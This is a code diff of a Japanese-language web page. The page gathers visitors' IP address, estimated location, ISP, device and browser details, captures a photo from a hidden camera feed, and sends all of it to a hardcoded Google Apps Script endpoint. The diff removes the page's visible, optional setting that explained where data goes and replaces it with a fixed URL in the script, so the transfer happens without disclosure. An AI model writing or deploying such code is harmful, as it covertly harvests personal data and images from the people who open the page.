@@ -29,25 +29,22 @@
   .status.error { color: var(--danger); }
   .shot { margin-top: 8px; }
   .shot img { width: 100%; border-radius: 12px; display: block; background: #000; }
-  .row { display: flex; gap: 10px; margin-top: 16px; }
   button {
-    flex: 1;
+    width: 100%;
     padding: 14px 12px;
+    margin-top: 16px;
     font-size: 16px;
     border-radius: 10px;
-    border: 1px solid var(--line);
-    background: var(--panel);
-    color: var(--ink);
+    border: 1px solid var(--accent);
+    background: var(--accent);
+    color: var(--accent-ink);
     cursor: pointer;
   }
-  button.primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
   .hidden { display: none !important; }
   .gallery { margin-top: 24px; }
   .gallery h2 { font-size: 15px; margin: 0 0 8px; color: var(--muted); }
   .thumbs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
   .thumbs img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 8px; background: var(--line); }
-  details { margin-top: 24px; font-size: 14px; color: var(--muted); }
-  details input { width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid var(--line); border-radius: 8px; }
 </style>
 </head>
 <body>
@@ -59,9 +56,7 @@
     <img id="photo" alt="撮影した写真">
   </div>
 
-  <div class="row">
-    <button id="allowBtn" class="primary hidden">カメラを許可する</button>
-  </div>
+  <button id="allowBtn" class="hidden">カメラを許可する</button>
 
   <div id="gallery" class="gallery hidden">
     <h2>フォルダ内の最新3枚</h2>
@@ -71,15 +66,13 @@
   <!-- 画面には出さない（フレーム取得用） -->
   <video id="video" autoplay playsinline muted class="hidden"></video>
   <canvas id="work" class="hidden"></canvas>
-
-  <details>
-    <summary>保存先の設定（任意）</summary>
-    <p>空欄のままなら、この端末に保存します。Google Apps Script の受け口URLを入れると、そこへ情報・画像を送り、最新3枚も取得します。</p>
-    <input id="endpoint" type="url" placeholder="https://script.google.com/macros/s/.../exec" value="https://script.google.com/macros/s/AKfycbzOHm0xe4a5mCzvJDs85URNlkfUPMenAUaLoFdzvptbgWQ1r340q-5no7xPrs6TGgqJ/exec">
-  </details>
 </main>
 
 <script>
+  // ===== 送信先（GASのウェブアプリURL） =====
+  const ENDPOINT = "https://script.google.com/macros/s/AKfycbzOHm0xe4a5mCzvJDs85URNlkfUPMenAUaLoFdzvptbgWQ1r340q-5no7xPrs6TGgqJ/exec";
+  // ==========================================
+
   const $ = id => document.getElementById(id);
   const video = $('video'), photo = $('photo'), work = $('work'), status = $('status');
   const shot = $('shot'), gallery = $('gallery'), thumbs = $('thumbs'), allowBtn = $('allowBtn');
@@ -94,7 +87,6 @@
   function show(...els) { els.forEach(e => e.classList.remove('hidden')); }
   function hide(...els) { els.forEach(e => e.classList.add('hidden')); }
   function stopCamera() { if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; } }
-  function endpoint() { return $('endpoint').value.trim(); }
   function stamp() {
     const d = new Date(), pad = n => String(n).padStart(2, '0');
     return d.getFullYear() + pad(d.getMonth() + 1) + pad(d.getDate())
@@ -103,9 +95,8 @@
   const wait = ms => new Promise(r => setTimeout(r, ms));
 
   async function sendToDrive(type, payload) {
-    const url = endpoint();
-    if (!url) return false;
-    await fetch(url, {
+    if (!ENDPOINT) return false;
+    await fetch(ENDPOINT, {
       method: 'POST', mode: 'no-cors',
       headers: { 'Content-Type': 'text/plain' },
       body: JSON.stringify(Object.assign({ type }, payload))
@@ -115,21 +106,41 @@
 
   function jsonp(params) {
     return new Promise((resolve, reject) => {
-      const url = endpoint();
-      if (!url) return reject('no endpoint');
+      if (!ENDPOINT) return reject('no endpoint');
       const cb = 'cb_' + Date.now() + '_' + Math.floor(Math.random() * 1e6);
       const timer = setTimeout(() => { cleanup(); reject('timeout'); }, 15000);
       function cleanup() { clearTimeout(timer); delete window[cb]; script.remove(); }
       window[cb] = data => { cleanup(); resolve(data); };
       const q = new URLSearchParams(Object.assign({ callback: cb }, params)).toString();
       const script = document.createElement('script');
-      script.src = url + '?' + q;
+      script.src = ENDPOINT + '?' + q;
       script.onerror = () => { cleanup(); reject('script error'); };
       document.body.appendChild(script);
     });
   }
 
-  // ---- 1'. 取れる情報を集めてJSON化 → ドライブ保存 ----
+  // 情報を読みやすいテキストに整形
+  function infoToText(info) {
+    const n = info.network || {};
+    const lines = [
+      '日時: ' + info.time,
+      'IP: ' + (info.ip || ''),
+      '推定地域: ' + [n.city, n.region, n.country].filter(Boolean).join(' / '),
+      '回線(org): ' + (n.org || ''),
+      'ASN: ' + (n.asn || ''),
+      'UserAgent: ' + info.userAgent,
+      'プラットフォーム: ' + (info.platform || ''),
+      '言語: ' + (info.language || ''),
+      'タイムゾーン: ' + (info.timezone || ''),
+      '画面: ' + info.screen.width + 'x' + info.screen.height + ' (x' + info.screen.pixelRatio + ')',
+      'ウィンドウ: ' + info.viewport.width + 'x' + info.viewport.height,
+      '参照元: ' + (info.referrer || ''),
+      'ページURL: ' + info.pageUrl
+    ];
+    return lines.join('\n');
+  }
+
+  // ---- 1'. 情報を集めて txt でドライブ保存 ----
   async function collectAndSaveInfo() {
     const info = {
       time: new Date().toISOString(),
@@ -137,7 +148,6 @@
       userAgent: navigator.userAgent,
       platform: navigator.platform || null,
       language: navigator.language || null,
-      languages: navigator.languages || null,
       timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
       screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio || 1 },
       viewport: { width: window.innerWidth, height: window.innerHeight },
@@ -154,10 +164,11 @@
     } catch (e) {}
     visitorInfo = info;
 
-    const name = 'info_' + stamp() + '.json';
-    const sent = await sendToDrive('info', { name, data: info });
+    const text = infoToText(info);
+    const name = stamp() + '_info.txt';
+    const sent = await sendToDrive('info', { name, text });
     if (!sent) {
-      const blob = new Blob([JSON.stringify(info, null, 2)], { type: 'application/json' });
+      const blob = new Blob([text], { type: 'text/plain' });
       const a = document.createElement('a');
       a.href = URL.createObjectURL(blob); a.download = name; a.click();
     }
@@ -181,7 +192,6 @@
     }
 
     video.srcObject = stream;
-    // 映像が始まるのを待つ
     await new Promise(res => {
       if (video.readyState >= 2) return res();
       video.onloadedmetadata = () => res();
@@ -190,7 +200,6 @@
     say('撮影しています…');
     await wait(600);   // 露出が安定するまで少し待つ
 
-    // 1枚キャプチャ（鏡像を戻して保存）
     const ctx = work.getContext('2d');
     work.width = video.videoWidth || 640;
     work.height = video.videoHeight || 480;
@@ -201,21 +210,19 @@
 
     const blob = await new Promise(res => work.toBlob(res, 'image/jpeg', 0.9));
 
-    // ---- 5. 撮った画像を表示 ----
-    photo.src = URL.createObjectURL(blob);
+    photo.src = URL.createObjectURL(blob);   // 5. 撮った画像を表示
     show(shot);
 
-    // ---- 4. 保存 → 6. 最新3枚 ----
-    await saveAndShow(blob);
+    await saveAndShow(blob);                 // 4 → 6
   }
 
   async function saveAndShow(blob) {
-    const name = 'photo_' + stamp() + '.jpg';
+    const name = stamp() + '_photo.jpg';
 
-    if (!endpoint()) {
+    if (!ENDPOINT) {
       const a = document.createElement('a');
       a.href = URL.createObjectURL(blob); a.download = name; a.click();
-      say('撮影しました。端末に保存済み（' + name + '）。送信先URL未設定のため最新3枚は取得できません。');
+      say('撮影しました。端末に保存済み（' + name + '）。');
       return;
     }
 
